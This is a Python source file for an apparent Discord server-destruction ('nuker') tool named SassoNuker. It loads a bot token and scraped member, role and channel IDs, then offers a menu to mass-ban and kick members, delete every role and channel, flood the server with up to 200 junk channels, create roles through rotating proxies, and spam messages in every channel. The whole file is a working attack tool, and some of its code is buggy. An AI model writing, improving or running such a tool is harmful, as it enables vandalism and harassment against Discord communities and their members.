import sys
import json
import string
import random
from os import system
from random import randint
from itertools import cycle
from time import time, sleep
from threading import Thread
from requests_futures.sessions import FuturesSession
from scrape_users import scrape
import pystyle

session = FuturesSession()
user_ids = []
role_ids = []
channel_ids = []
proxies = []
rotating = cycle(proxies)
deleted_roles=[]
if sys.platform == "linux":
    clear = lambda: system("clear")
else:
    clear = lambda: system("cls")

 
menu = pystyle.Colorate.Horizontal(pystyle.Colors.white_to_green, '''

   _____                     _   _       _             
  / ____|                   | \ | |     | |            
 | (___   __ _ ___ ___  ___ |  \| |_   _| | _____ _ __ 
  \___ \ / _` / __/ __|/ _ \| . ` | | | | |/ / _ \ '__|
  ____) | (_| \__ \__ \ (_) | |\  | |_| |   <  __/ |   
 |_____/ \__,_|___/___/\___/|_| \_|\__,_|_|\_\___|_|   
                                                       
                                                       

''')



with open('config.json') as f:
    config = json.load(f)

Token = config.get('token')

headers = {"Authorization": f"Bot {Token}"}


import requests
class sassoNueker:

    def validToken(token):
        
        headers={"Authorization": f"Bot {token}"}
        

        req=requests.get(f"https://discord.com/api/v9/users/@me", headers=headers)
        
        if req.status_code==200:
            print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, "[!] Token Valido"))
            return True
        else:
            print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_black, "[!] Token Invalido"))
            return False
        
    def banUser(guild_id, member_id):
        try:
            req=session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers)
            if req.status_code == 200 or  req.status_code == 201 or req.status_code == 204:
                print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, f"[!] Banned {member_id}"))
            if req.status_code == 429:
                retry_after = req.headers.get('Retry-After')
                if retry_after:
        # sleep for the time indicated by Retry-After header
                    time.sleep(int(retry_after))
                Thread(target=sassoNueker.banUser, args=(guild_id, member_id,)).start()
            else:
                print(req.status_code)
        except:
            pass

    def unbanUser(guild_id, member_id):
        try:
            req=session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers)
            if req.status_code == 200 or req.status_code == 201 or req.status_code == 204:
                print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, f"[!] Unanned {member_id}"))
            if req.status_code==429:
                retry_after = req.headers.get('Retry-After')
                if retry_after:
        # sleep for the time indicated by Retry-After header
                    time.sleep(int(retry_after))
                Thread(target=sassoNueker.unbanUser, args=(guild_id, member_id)).start()
            else:
                print(req.status_code)
        except:
            pass
    def kickUser(guild_id, member_id):
        try:
            req = session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/members/{member_id}", headers=headers).result()
            if req.status_code == 200 or req.status_code == 201 or req.status_code == 204:
                print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, f"[!] Kicked {member_id}"))
            if req.status_code == 429:
                retry_after = req.headers.get('Retry-After') 
                if retry_after: 
                    time.sleep(int(retry_after)) 
                Thread(target=sassoNueker.kickUser, args=(guild_id, member_id,)).start()
            else:
                print(req.status_code)
        except: 
            pass
    def delChannel(guild_id, channel_id):
        try:
            req = session.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers).result()
            if req.status_code == 200 or req.status_code == 201 or req.status_code == 204:
                print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, f"[!] Deleted {channel_id}"))
            if req.status_code == 429:
                retry_after = req.headers.get('Retry-After')
                if retry_after:
        # sleep for the time indicated by Retry-After header
                    time.sleep(int(retry_after))
                Thread(target=sassoNueker.delChannel, args=(channel_id,)).start()
            elif Exception:
                print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, "[?] Unknown error LOL"))
        except Exception as e: 
            print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, f"[!] Error deleting channel {channel_id}: {e}"))

    def delRole(guild_id, role_id):
        
        
        for i in range(150):
            try:
                req = session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers,).result()
                if req.status_code == 204:
                    print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow,f"Role {role_id} deleted."))
                    deleted_roles.append(role_id)
                    break  # exit the loop once the role is deleted
                elif req.status_code == 429:
                    retry_after = req.headers.get('Retry-After')
                    if retry_after:
                        # sleep for the time indicated by Retry-After header
                        sleep(int(retry_after))
                    
                
                else:
                    print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, f"[!] Error deleting role {role_id}: {req.status} {req.text()}"))
            except Exception as e: 
                print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, f"[!] Error deleting role {role_id}: {e}"))
                break  # exit the loop since there was an error
                
            sleep(0.5)  # add a delay between requests to avoid hitting rate limits

        else:
            print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, f"[!] Error deleting role {role_id}"))

        return

    def crCh(guild_id, ch_name):
        try:
            name = ch_name
            json = {'name': name, 'type': randint(0,8)}
            req = session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json=json, ).result()
            if req.status_code == 200 or req.status_code == 201 or req.status_code == 204:
                print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, f"Created Channel {req.json()['id']}"))
                channel_ids.append(req.json()["id"])
            if req.status_code == 429:
                retry_after = req.headers.get('Retry-After')
                if retry_after:
        # sleep for the time indicated by Retry-After header
                    time.sleep(int(retry_after))
                Thread(target=sassoNueker.crCh, args=(guild_id,ch_name,)).start()
        except:
            pass

    def crRl(guild_id, ch_name):
       try:
            name = ch_name
            json = {'name': name}
            r = session.post(f'https://discord.com/api/v{randint(6,8)}/guilds/{guild_id}/roles', headers=headers, json=json, proxies={"http": 'http://' + next(rotating)}).result()
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"     \x1b[38;5;199m[\x1b[0m~\x1b[38;5;199m] \x1b[0mSuccessfully Created Role {r.json()['id']}")
            if r.status_code == 429:
                Thread(target=sassoNueker.Create_Role, args=(guild_id,)).start()
       except:
            pass
    def spam():
        ch_id = input(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_green, "[>] Channel ID --> "))
        msgid = input(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_green, "[>] Content: ")) 
        amount = int(input(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_green, "[>] Amount: ")))

        for i in range(int(amount)):
            params = {'content': msgid}
            try:
                response = requests.post(f'https://discord.com/api/v9/channels/{ch_id}/messages',headers=headers, data={"content":msgid})
                if response.status_code == 200:
                    print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, f"Sent Message: {msgid}, in: {ch_id}"))
                if response.status_code == 429:
                    retry_after = response.headers.get('Retry-After')
                    if retry_after:
        # sleep for the time indicated by Retry-After header
                        time.sleep(int(retry_after))
                        Thread(target=sassoNueker.spam, args=()).start()
                else:
                    pass
                    
            except Exception as e:
                pass
    def spamguild():
        msgid = pystyle.Write.Input(pystyle.Colors.blue, pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_green, "[>] Content: ")) 
        for ch_id in channel_ids:
            
            for i in range(20):
                params = {'content': msgid}
                response = requests.post(f'https://discord.com/api/v9/channels/{ch_id}/messages',headers=headers,data=params)
                if response.status_code == 200:
                    print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_yellow, f"Sent Message: {msgid}, in: {ch_id}"))
                else:
                    print(response.status_code)
from scrape_users import scrape
def start(guild, ch_name):
    
    
    if sassoNueker.validToken(Token):
        
        

        try:
            members = open('scraped/members.txt').readlines()
            for member in members:
                member = member.replace("\n", "")
                user_ids.append(member)

            roles = open('scraped/roles.txt').readlines()
            for role in roles:
                role = role.replace("\n", "")
                role_ids.append(role)

            channels = open('scraped/channels.txt').readlines()
            for channel in channels:
                channel = channel.replace("\n", "")
                channel_ids.append(channel)
        except:
            print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow,f"[!] Unknown Error while Scraping"))

        print(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_purple, f"[!] Members: {len(user_ids)} "))
        print(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_purple, f"[!] Roles: {len(role_ids)} "))
        print(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_purple, f"[!] Channels: {len(channel_ids)} "))
        sleep(2)
        principal(guild, ch_name)
    else:
        
        input()
        exit()

import concurrent.futures
import time

def principal(guild, ch_name):
    
    while True:
        print(menu)
        print(pystyle.Colorate.Horizontal(pystyle.Colors.purple_to_red,'''
[1] Ban Users
[2] Kick Users
[3] Unban Users
[4] Delete Roles
[5] Delete Channels
[6] Create Channels
[7] Create Roles [NEEDS A FIX]
[8] Spam a channel
[9] Spam Guild
            '''))
        opt = input(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_green, "[>] Input option: "))
        if opt == "1":
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                for user_id in user_ids:
                    executor.submit(sassoNueker.banUser, guild, user_id)
            time.sleep(2)
        elif opt == "2":
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                for user_id in user_ids:
                    executor.submit(sassoNueker.kickUser, guild, user_id)
            time.sleep(2)
        elif opt == "3":
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                for user_id in user_ids:
                    executor.submit(sassoNueker.unbanUser, guild, user_id)
            time.sleep(2)
        elif opt == "4":
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                for role_id in role_ids:
                    if role_id in deleted_roles:
                        pass
                    executor.submit(sassoNueker.delRole, guild, role_id)
            time.sleep(2)
        elif opt == "5":
            with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
                for channel_id in channel_ids:
                    executor.submit(sassoNueker.delChannel, guild, channel_id)
            time.sleep(2)
        elif opt == "6":
            with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
                for i in range(200):
                    executor.submit(sassoNueker.crCh, guild, ch_name)
            time.sleep(2)
        elif opt == "7":
            for i in range(150):
                Thread(target=sassoNueker.crRl, args=(guild, ch_name)).start()

        elif opt == "8":
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                executor.submit(sassoNueker.spam)
        elif opt == "9":
            with concurrent.futures.ThreadPoolExecutor(max_workers=len(channel_ids)) as executor:
                executor.submit(sassoNueker.spamguild)
        else:
            print(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow,"Invalid option"))

        input(pystyle.Colorate.Horizontal(pystyle.Colors.red_to_yellow, "Press Enter to continue..."))

# hi


if __name__ == "__main__":
    guild = int(input(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_green, "[>] Guild ID: ")))
    ch_name = input(pystyle.Colorate.Horizontal(pystyle.Colors.blue_to_green, "[>] Name of Everything"))
    scrape(guild)
    start(guild, ch_name)
